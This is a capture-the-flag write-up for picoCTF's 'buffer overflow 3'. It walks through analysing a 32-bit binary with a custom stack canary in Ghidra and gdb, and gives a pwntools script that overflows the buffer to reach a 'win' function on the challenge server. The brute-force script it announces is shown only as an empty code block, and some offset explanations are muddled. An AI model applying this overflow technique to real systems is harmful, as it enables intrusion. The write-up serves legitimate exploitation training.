# buffer overflow 3
#### Write-up author: [jon-brandy](https://github.com/jon-brandy)
## DESCRIPTION:
Do you think you can bypass the protection and get the flag?
It looks like Dr. Oswal added a stack canary to this [program](https://github.com/jon-brandy/CTF-WRITE-UP/blob/d6703447a725fc59dc635aa42beeaee467577564/Asset/buffer%20overflow%203/vuln) to protect against buffer overflows. You can view source [here](https://github.com/jon-brandy/CTF-WRITE-UP/blob/d6703447a725fc59dc635aa42beeaee467577564/Asset/buffer%20overflow%203/vuln.c). 
And connect with it using: `nc saturn.picoctf.net 64367`
## HINT:
1. Maybe there's a smart way to brute-force the canary?
## STEPS:
1. First, download both files given.
2. Next, check the `program` file type.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/205282085-16cadf79-8bcb-4864-a717-071610270ae6.png)


3. The file is 32 bit, dynamically linked and **not stripped**. Not stripped means we can see the functions names when decompiled it.
4. Now check the file's protection.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/205282165-23a2f61b-e3bd-4a76-ae90-63970070b521.png)


5. **No canary found** means we can do buffer overflow here and **no PIE** means the program won't produce a dynamically linked position independent executeable.
6. Let's make the program executeable by run `chmod +x vuln`.
7. Now run the program.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/205285240-7aea9ded-010d-4fa9-8ff0-4ede34a2f537.png)


8. Seems we need to make `canary.txt` first.
9. Let's make it and enter the word "flag" into the file and run the program again.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/205285674-ebcdc8a7-c0af-4484-bd7f-9fd28145ccb2.png)


10. Hmm.. Let's decompile the file with ghidra.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/205285883-91545670-ca12-410f-82f8-67e685e28721.png)


11. Jump to the `vuln()` function.

![image](https://user-images.githubusercontent.com/70703371/205285997-4cf78ad6-b874-40d1-b5b7-fbfefb10d6d7.png)


12. Try to input the bytes value as `64` and the input as 64 characters of A.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/205286531-0dc7a5e9-da42-47fc-b93b-fc5ca0f965b1.png)


13. Let's input 68 as the value bytes now and the input as 68 characters of A.

> RESULT


![image](https://user-images.githubusercontent.com/70703371/205286782-55bced89-dc16-4049-91f9-f728e15a2755.png)


14. Notice here, we need to overflow any other variables we have on the saved ebp or rbp before we can get to the `win` function.

> ALL VARIABLES WE NEED TO OVERFLOWED

![image](https://user-images.githubusercontent.com/70703371/205287604-f07aea16-dfcd-4499-82ef-26e02fc31c3a.png)


> THE EBP/RBP

![image](https://user-images.githubusercontent.com/70703371/205287685-9372ef70-ddb4-43bf-8dae-b92beb13a10c.png)


15. Now open the file in gdb and set the breakpoint at the **memcp** offset.

![image](https://user-images.githubusercontent.com/70703371/205288798-f5493083-6ae9-4a29-98d0-669ac72ae22b.png)


> GDB

![image](https://user-images.githubusercontent.com/70703371/205288956-7522ae33-904b-48b0-ab32-5df5d7324329.png)


![image](https://user-images.githubusercontent.com/70703371/205289016-8d2b76c8-c978-4782-b14e-e363619adaa2.png)


![image](https://user-images.githubusercontent.com/70703371/205289058-2f85b287-8647-48b0-91cb-a4837bd8156a.png)


16. The program compared our last 4 characters to the `test` (which is our canary).

![image](https://user-images.githubusercontent.com/70703371/205289424-9a025a3d-932b-4c01-a424-c0dbb3f57efa.png)


17. Based from it we can conclude the right padding is 64 bytes.
18. At this stage, we know we need to add 64 bytes for the padding plus 4 bytes for the canary, also another 16 bytes (include the saved RBP) in total to overwrite other variables.

![image](https://user-images.githubusercontent.com/70703371/205296017-c866e35d-d872-4f20-ada2-94510be44d48.png)


19. But the `flag` is our own local canary, the problem is we don't know the remote server's canary.
20. So far our script look like this:

> TEMPORARY SCRIPT

```py
from pwn import *
import os

os.system('clear')

sh = remote('saturn.picoctf.net', 54124)

p = b'A' * 64
p += b'flag'
p += b'A' * 16 # 4 + 4 + 4 + saved RBP (4)
p += p32(134517558)
context.log_level = 'debug'
sh.recvuntil(b'>')
sh.sendline(b'144') # 64 + 64 + 4 + 4 + 4 + 4
sh.recvuntil(b'>')
sh.sendline(p)
sh.interactive()
```

21. To bruteforce the remote's canary, i made this python script:

> CANARY BRUTE SCRIPT

```py
```

